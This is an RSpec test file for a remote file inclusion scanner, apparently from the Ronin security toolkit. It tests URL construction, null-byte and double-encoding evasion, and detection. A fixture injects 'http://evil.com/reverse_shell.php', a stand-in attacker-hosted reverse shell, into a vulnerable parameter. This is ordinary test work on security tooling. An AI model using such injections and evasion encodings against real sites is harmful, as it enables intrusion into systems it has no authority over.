require 'spec_helper'
require 'ronin/vuln/rfi'

require 'webmock/rspec'

describe Ronin::Vuln::RFI do
  describe "TEST_SCRIPT_URL" do
    subject { described_class::TEST_SCRIPT_URL }

    it "must be a publically accessible URL", :network do
      response = Net::HTTP.get_response(URI(subject))

      expect(response.code.to_i).to eq(200)
      expect(response.body).to_not be_empty
    end
  end

  describe ".test_script_url" do
    subject { described_class }

    it "must have a default test_script URL" do
      expect(subject.test_script_url).to eq(described_class::TEST_SCRIPT_URL)
    end
  end

  describe ".test_script_url=" do
    subject { described_class }

    let(:new_url) { 'http://www.example.com/test.php' }

    before do
      subject.test_script_url = new_url
    end

    it "must set .test_script_url URL" do
      expect(subject.test_script_url).to eq(new_url)
    end

    after { subject.test_script_url = described_class::TEST_SCRIPT_URL }
  end

  let(:param) { 'vuln' }
  let(:url)   { URI("https://example.com/page.php?q=foo&#{param}=bar") }

  subject { described_class.new(url,param) }

  describe "#initialize" do
    it "must set #url" do
      expect(subject.url).to eq(url)
    end

    it "must set #param" do
      expect(subject.param).to eq(param)
    end

    context "when the given url is a String" do
      let(:url) { "https://example.com/page.php?q=foo&#{param}=bar" }

      it "must automatically parse the given URL" do
        expect(subject.url).to eq(URI.parse(url))
      end
    end

    context "when the given param is a Symbol" do
      let(:param) { :vuln }

      it "must convert it to a String" do
        expect(subject.param).to eq(param.to_s)
      end
    end

    it "must default #test_script_url to TEST_SCRIPT_URL" do
      expect(subject.test_script_url).to eq(described_class::TEST_SCRIPT_URL)
    end

    it "must default #evasion to nil" do
      expect(subject.evasion).to be(nil)
    end

    context "when given the test_script_url: keyword argument" do
      let(:test_script_url) { 'https://example.com/alternate/test_script.php' }

      subject do
        described_class.new(url,param, test_script_url: test_script_url)
      end

      it "must set #test_script_url" do
        expect(subject.test_script_url).to eq(test_script_url)
      end
    end

    context "when given the evasion: keyword argument" do
      let(:evasion) { :null_byte }

      subject { described_class.new(url,param, evasion: evasion) }

      it "must set #evasion" do
        expect(subject.evasion).to eq(evasion)
      end
    end
  end

  let(:rfi_url) { 'http://evil.com/reverse_shell.php' }

  describe "#url_for" do
    let(:uri_escaped_rfi_url) { URI::QueryParams.escape(rfi_url) }

    it "must replace the vulnerable param with the RFI script" do
      expect(subject.url_for(rfi_url)).to eq(
        URI("https://example.com/page.php?q=foo&#{param}=#{uri_escaped_rfi_url}")
      )
    end

    context "when #evasion is :null_byte" do
      subject { described_class.new(url,param, evasion: :null_byte) }

      it "must append %00 to the RFI URL" do
        expect(subject.url_for(rfi_url)).to eq(
          URI("https://example.com/page.php?q=foo&#{param}=#{uri_escaped_rfi_url}%00")
        )
      end
    end

    context "when #evasion is :double_encode" do
      subject { described_class.new(url,param, evasion: :double_encode) }

      let(:double_uri_escaped_rfi_url) do
        URI::QueryParams.escape(uri_escaped_rfi_url)
      end

      it "must URI escape the RFI URL twice" do
        expect(subject.url_for(rfi_url)).to eq(
          URI("https://example.com/page.php?q=foo&#{param}=#{double_uri_escaped_rfi_url}")
        )
      end
    end
  end

  describe "#include_url" do
    let(:response_body) { "<html><body>test body</body></html>" }
    let(:request_url)   { subject.url_for(rfi_url) }

    it "must call Net::HTTP.get with #url_for" do
      stub_request(:get,request_url).to_return(body: response_body)

      expect(subject.include_url(rfi_url)).to eq(response_body)

      expect(WebMock).to have_requested(:get,request_url)
    end
  end

  describe "#vulnerable?" do
    let(:request_url) { subject.url_for(subject.test_script_url) }
    let(:response_body) do
      <<~HTML
        <html>
          <body>
            <p>example content</p>
            <p>included content</p>
            <p>more content</p>
          </body>
        </html>
      HTML
    end

    it "must make a GET request with #test_script_url included into #url" do
      stub_request(:get,request_url).to_return(body: response_body)

      subject.vulnerable?

      expect(WebMock).to have_requested(:get,request_url)
    end

    context "when the response body contains 'Remote File Inclusion (RFI) Detected: eval(\"1 + 1\") = 2'" do
      let(:response_body) do
        <<~HTML
          <html>
            <body>
              <p>example content</p>
              Remote File Inclusion (RFI) Detected: eval("1 + 1") = 2
              <p>more content</p>
            </body>
          </html>
        HTML
      end

      it "must return true" do
        stub_request(:get,request_url).to_return(body: response_body)

        expect(subject.vulnerable?).to be(true)
      end
    end

    context "when the response body does not contain 'Remote File Inclusion (RFI) Detected: eval(\"1 + 1\") = 2'" do
      it "must return false" do
        stub_request(:get,request_url).to_return(body: response_body)

        expect(subject.vulnerable?).to be(false)
      end
    end
  end
end
